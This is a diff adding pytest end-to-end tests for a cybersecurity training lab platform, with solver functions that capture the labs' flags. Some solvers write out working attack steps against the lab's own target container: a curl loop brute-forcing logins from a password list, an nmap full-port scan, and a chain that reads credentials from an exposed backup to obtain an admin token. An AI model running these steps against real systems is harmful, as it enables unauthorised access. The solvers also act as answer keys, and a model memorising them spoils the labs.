@@ -726,3 +726,136 @@ def test_target_labs_end_to_end(client, lab):
         assert r["progress"]["solved"] == r["progress"]["total"]
     finally:
         destroy_all(client, ws, envs)
+
+
+def _solve(client, lab, solver):
+    """Start a lab, let `solver(sh_in_machine)` find the answers, check them all."""
+    out = client.post(f"/v1/labs/{lab}/start", headers=auth()).json()
+    ws = out["workspaceId"]
+    envs = client.get(f"/v1/workspaces/{ws}/environments", headers=auth()).json()
+    try:
+        assert out.get("setupError") is None, out
+        boxes = {e["name"]: e["resources"]["container"] for e in envs}
+        me = next(n for n in boxes if n != "target")
+
+        def run(cmd):
+            code, text = sh(boxes[me], cmd, interpreter="bash")
+            return text
+
+        answers = solver(run)
+        for task, value in answers.items():
+            r = client.post(
+                f"/v1/workspaces/{ws}/lab/answer",
+                json={"task": task, "answer": value},
+                headers=auth(),
+            ).json()
+            assert r["correct"] is True, (lab, task, value)
+        assert r["progress"]["solved"] == r["progress"]["total"]
+    finally:
+        destroy_all(client, ws, envs)
+
+
+FLAG = r"CL\{[0-9a-f]{16}\}"
+
+
+def test_linux_labs_solved_with_the_hinted_commands(client):
+    """No tool packs needed: the hints' commands work on a plain Ubuntu machine."""
+    import re
+
+    def crypto(run):
+        wanted = run("tail -1 puzzles/WANTED.txt")
+        leaked = run(f"sha256sum puzzles/reports/* | grep {wanted}").split("/")[-1]
+        return {
+            "base64-flag": re.search(FLAG, run("base64 -d puzzles/message.b64")).group(),
+            "hex-flag": re.search(FLAG, run("basenc --base16 -d puzzles/message.hex")).group(),
+            "rot13-flag": re.search(
+                FLAG, run("tr 'A-Za-z' 'N-ZA-Mn-za-m' < puzzles/message.rot13")
+            ).group(),
+            "leaked-file": leaked,
+        }
+
+    def perms(run):
+        assert "Permission denied" in run("./perms/hello.sh")
+        assert "Permission denied" in run("cat perms/locked.txt")
+        return {
+            "run-flag": re.search(FLAG, run("chmod +x perms/hello.sh && ./perms/hello.sh")).group(),
+            "locked-flag": re.search(
+                FLAG, run("chmod u+r perms/locked.txt && cat perms/locked.txt")
+            ).group(),
+            "risky-file": run("find perms/configs -perm -o+w").split("/")[-1],
+        }
+
+    def incident(run):
+        ip = run("awk '$9 == 404 {print $1}' access.log | sort | uniq -c | sort -n | tail -1")
+        ip = ip.split()[-1]
+        tool = run(f"grep '^{ip} ' access.log | awk -F'\"' '{{print $6}}' | sort | uniq -c")
+        tool = next(line.split()[-1] for line in tool.splitlines() if "/" in line.split()[-1])
+        shell = run("grep 'cmd=' access.log | head -1 | awk '{print $7}'").split("?")[0]
+        return {"scanner-ip": ip, "scanner-tool": tool.split("/")[0], "webshell-path": shell}
+
+    _solve(client, "crypto-basics", crypto)
+    _solve(client, "linux-permissions", perms)
+    _solve(client, "incident-response-web", incident)
+
+
+@pytest.mark.skipif(
+    os.environ.get("CYBERLAB_DOCKER_BUILD_TESTS") != "1",
+    reason="installs curl, nmap and binwalk; needs internet access during image builds",
+)
+def test_intermediate_and_advanced_labs_end_to_end(client):
+    import re
+
+    wait = (
+        "for i in $(seq 1 60); do (exec 3<>/dev/tcp/target/22) 2>/dev/null && break; "
+        "(exec 3<>/dev/tcp/target/80) 2>/dev/null && break; sleep 0.5; done"
+    )
+
+    def logins(run):
+        run(wait)
+        admin = re.search(r"Ask our (\w+) at", run("curl -s http://target/")).group(1)
+        loop = (
+            'while read p; do echo "PASS $p"; '
+            f'curl -s "http://target/login?user={admin}&password=$p"; echo; '
+            "done < passwords.txt | grep -B1 Welcome"
+        )
+        key = re.search(r"API_KEY = '(\w+)'", run("curl -s http://target/static/app.js")).group(1)
+        return {
+            "admin-user": admin,
+            "login-flag": re.search(FLAG, run(loop)).group(),
+            "key-flag": re.search(
+                FLAG, run(f'curl -s "http://target/api/fleet?key={key}"')
+            ).group(),
+        }
+
+    def chain(run):
+        run(wait)
+        scan = run("nmap -Pn -p- --min-rate 2000 target")
+        port = next(p for p in re.findall(r"^(\d+)/tcp\s+open", scan, re.M) if p != "22")
+        backup = re.search(r"moved to (\S+)", run(f"curl -s http://target:{port}/")).group(1)
+        creds = dict(
+            line.split("=", 1)
+            for line in run(f"curl -s http://target:{port}{backup}").splitlines()
+            if "=" in line
+        )
+        u, p = creds["service_user"], creds["service_password"]
+        token = re.search(
+            r'"token": "(\w+)"',
+            run(f'curl -s "http://target:{port}/api/token?user={u}&password={p}"'),
+        ).group(1)
+        flag = re.search(FLAG, run(f'curl -s "http://target:{port}/api/admin/flag?token={token}"'))
+        return {"web-port": port, "service-user": u, "chain-flag": flag.group()}
+
+    def forensics(run):
+        note = re.search(FLAG, run("grep -a -o 'note: CL{[0-9a-f]*}' evidence.png")).group()
+        scan = run("binwalk evidence.png")
+        offset = re.search(r"^(\d+)\s+0x[0-9A-F]+\s+gzip", scan, re.M | re.I).group(1)
+        carved = run(f"tail -c +{int(offset) + 1} evidence.png | gunzip")
+        return {
+            "note-flag": note,
+            "gzip-offset": offset,
+            "carved-flag": re.search(FLAG, carved).group(),
+        }
+
+    _solve(client, "web-logins", logins)
+    _solve(client, "recon-chain", chain)
+    _solve(client, "file-forensics", forensics)
